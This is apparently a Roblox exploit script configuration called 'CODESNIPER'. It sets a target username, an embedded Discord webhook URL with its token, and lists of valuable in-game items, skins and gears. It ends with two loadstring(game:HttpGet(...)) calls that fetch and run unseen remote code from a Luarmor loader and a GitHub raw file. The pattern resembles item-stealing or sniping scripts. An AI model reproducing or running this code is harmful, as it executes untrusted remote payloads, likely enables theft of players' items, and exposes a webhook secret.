-- Mode: CODESNIPER
getgenv().TARGET_USERNAME = "Yeatdude19"
getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1554261548900290612/IbFSk3q-LvVCnISVPgdORpC4PK8cNTwveV16P7FEypotKtT15tjwb5HJFoJFEibejGTP"
getgenv().NORMAL_BRAINROTS = {
    ["Headless Horseman"] = true,
    ["John Pork"] = true,
    ["Meowl"] = true,
    ["Skibidi Toilet"] = true,
    ["Spyder Elephant"] = true,
    ["Strawberry Elephant"] = true,
    ["Arcadragon"] = true,
    ["Dragon Aquanini"] = true,
    ["Dragon Cannelloni"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Dragon Gingerini"] = true,
    ["Los Dragons"] = true,
    ["Chipso and Queso"] = true,
    ["Bunny and Eggy"] = true,
    ["Coco and Mango"] = true,
    ["Cooki and Milki"] = true,
    ["Burguro And Fryuro"] = true,
    ["Cuadramat and Pakrahmatmamat"] = true,
    ["Fortunu and Cashuru"] = true,
    ["Fragrama and Chocrama"] = true,
    ["Garama and Madundung"] = true,
    ["Ketchuru and Musturu"] = true
}
getgenv().NORMAL_BASE_SKINS = {
    ["Rose"] = true,
    ["Gingerbread"] = true,
    ["Halloween"] = true,
    ["Christmas"] = true,
    ["Bunny Basket"] = true,
    ["Summer"] = true,
    ["Pot of Gold"] = true,
    ["Taco"] = true,
    ["Octo"] = true,
    ["Valentines"] = true,
    ["Easter"] = true,
    ["Lucky"] = true,
    ["Aquatic"] = true,
    ["Tralalero"] = true,
    ["Bee Emperor"] = true,
    ["Honey Bee"] = true
}
getgenv().NORMAL_GEARS = {
    ["Santa's Sleigh"] = true,
    ["Cupid's Wings"] = true,
    ["Witch's Broom"] = true,
    ["Waverider"] = true,
    ["Yin Yang Slap"] = true,
    ["Cursed Slap"] = true,
    ["Cyber Slap"] = true,
    ["Divine Slap"] = true,
    ["Bloodmoon Slap"] = true,
    ["Radioactive Slap"] = true,
    ["Rainbow Slap"] = true,
    ["Rainbow Hammer"] = true,
    ["Bloodmoon Hammer"] = true,
    ["Radioactive Airstrike"] = true,
    ["Yin Yang Lamp"] = true,
    ["Demon's Head"] = true,
    ["Lava Slap"] = true,
    ["Lava Blaster"] = true,
    ["Alien Slap"] = true,
    ["Blackhole Bomb"] = true,
    ["Candy Sentry"] = true,
    ["Phantom Slap"] = true,
    ["Flying Bee"] = true,
    ["Crystal Slap"] = true,
    ["Candy Slap"] = true
}

-- Cargando GUI SNIPER
task.spawn(function()
   loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()
end)

-- Cargando Sniper.lua desde GitHub
task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/sab-api/GUISNIPER/refs/heads/main/Sniper.lua"))()
end)